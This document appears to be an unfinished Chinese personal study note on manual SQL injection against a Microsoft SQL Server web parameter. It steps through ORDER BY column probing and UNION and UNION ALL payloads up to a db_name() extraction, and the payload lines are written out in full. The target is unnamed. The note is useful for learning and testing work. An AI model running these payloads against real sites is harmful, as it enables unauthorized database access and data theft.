---
description: mysql的手注已经轻车熟路了，尝试一下mssql的注入
---

# SQLserver手注过程

注点寻找

![](../.gitbook/assets/image%20%2878%29.png)

进一步确认，页面正常

![](../.gitbook/assets/image%20%2848%29.png)

测试字段数：

* key=ss%27 order by 2 --  正常
* key=ss%27 order by 4 --  报错  但不是字段数的问题
* key=ss' order by 8 --   字段数不正确 
* key=ss' order by 6 --   字段数不正确
* key=ss' order by 5 -- 字段数不正确

确认字段数为4   来看一下报错

![](../.gitbook/assets/image%20%2879%29.png)

应该是类型不同的原因  直接尝试union查询

key=ss' and 1=2 union select 1,2,3,4 --     报错

![](../.gitbook/assets/image%20%2816%29.png)

可能是因为有字符串  改造payload：key=ss' and 1=2 union select '1','2','3','4' --

![](../.gitbook/assets/image%20%28139%29.png)

上网查找错误： 产生这一错误的原因是union语句合并查询时是默认去除重复项的，也就是默认执行了distinct操作。改用union all

![](../.gitbook/assets/image%20%2898%29.png)

位置确认了  测试数据库名字 key=ss' and 1=2 union all select '1',db\_name\(\),'3','4' --

![](../.gitbook/assets/image%20%28134%29.png)

未完待续…

